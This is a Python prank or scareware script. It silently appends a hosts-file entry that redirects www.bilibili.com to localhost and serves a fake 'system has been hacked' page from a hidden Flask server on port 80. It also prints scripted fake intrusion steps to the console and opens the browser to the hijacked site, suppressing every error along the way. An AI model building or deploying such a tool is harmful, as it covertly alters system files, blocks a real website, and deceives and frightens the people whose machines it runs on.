```
import logging
import os
import time
import platform
import threading
from flask import Flask

# 检查操作系统类型
SYSTEM = platform.system()

# 修改hosts文件（静默执行）
def modify_hosts():
    """
    在hosts文件中添加一行记录，将www.bilibili.com指向127.0.0.1。
    如果已经存在目标记录，则不进行任何操作。
    """
    target = "127.0.0.1 www.bilibili.com"
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if SYSTEM == "Windows" else r"/etc/hosts"
    
    try:
        with open(hosts_path, 'r', encoding='utf-8') as f:
            if target in f.read():
                return  # 如果已经修改过，直接返回
        
        with open(hosts_path, 'a', encoding='utf-8') as f:
            f.write(f"\n{target}\n")
    except Exception as e:
        pass  # 静默失败，不显示任何提示

# 恢复hosts文件（静默执行）
def restore_hosts():
    """
    从hosts文件中删除包含www.bilibili.com的记录。
    """
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if SYSTEM == "Windows" else r"/etc/hosts"
    try:
        with open(hosts_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        with open(hosts_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if "www.bilibili.com" not in line:
                    f.write(line)
    except Exception as e:
        pass  # 静默失败，不显示任何提示

# 启动Flask服务器（静默执行）
def start_flask():
    """
    启动一个Flask服务器，监听127.0.0.1的80端口。
    返回一个模拟入侵的HTML页面。
    """
    # 设置日志级别为ERROR，隐藏启动信息
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    app = Flask(__name__)

    @app.route('/')
    def hacked_page():
        return '''
        <html>
        <head>
          <title>系统被入侵</title>
          <style>
            body { background: black; color: lime; font-family: monospace; }
            h1 { color: red; }
            .blink { animation: blink 1s steps(2, start) infinite; }
            @keyframes blink { to { visibility: hidden; } }
          </style>
        </head>
        <body>
          <h1>！！！系统已被入侵！！！</h1>
          <p class="blink">警告：未授权访问</p>
          <p>你的所有数据已被我们掌控！</p>
          <p>sysedge@root:~# <span id="cmd"></span></p>
          <script>
            const commands = [
              "正在初始化入侵...",
              "正在绕过防火墙...",
              "正在注入恶意代码...",
              "正在窃取数据...",
              "正在清除痕迹..."
            ];
            let i = 0;
            const cmdElement = document.getElementById('cmd');
            function typeCommand() {
              if (i < commands.length) {
                cmdElement.textContent = commands[i];
                i++;
                setTimeout(typeCommand, 2000);
              }
            }
            typeCommand();
          </script>
        </body>
        </html>
        '''

    app.run(host='127.0.0.1', port=80)

# 打开浏览器（静默执行）
def open_browser():
    """
    在浏览器中打开http://www.bilibili.com。
    """
    time.sleep(2)  # 等待服务器启动
    url = "http://www.bilibili.com"
    try:
        if SYSTEM == "Windows":
            os.system(f"start {url}")
        elif SYSTEM == "Darwin":
            os.system(f"open {url}")
        else:
            os.system(f"xdg-open {url}")
    except Exception as e:
        pass  # 静默失败，不显示任何提示

# 显示入侵过程（中文）
def show_fake_process():
    """
    在控制台中显示模拟入侵的过程。
    """
    messages = [
        "[*] 正在扫描目标网络...",
        "[+] 发现漏洞：CVE-2023-XXXX",
        "[*] 正在利用目标系统...",
        "[+] 成功绕过防火墙！",
        "[*] 正在获取管理员权限...",
        "[+] 数据窃取中...",
        "[*] 正在清除入侵痕迹...",
        "[!] 任务完成！"
    ]
    
    for msg in messages:
        print(msg)
        time.sleep(2)

if __name__ == "__main__":
    # 恢复hosts文件（确保之前的状态被清理）
    restore_hosts()
    
    # 修改hosts文件
    modify_hosts()
    
    # 启动Flask服务器
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    
    # 显示入侵过程
    show_fake_process()
    
    # 打开浏览器
    open_browser()
    
    # 保持程序运行
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # 恢复hosts文件
        restore_hosts()
        print("\n程序已退出，hosts文件已恢复。")

```
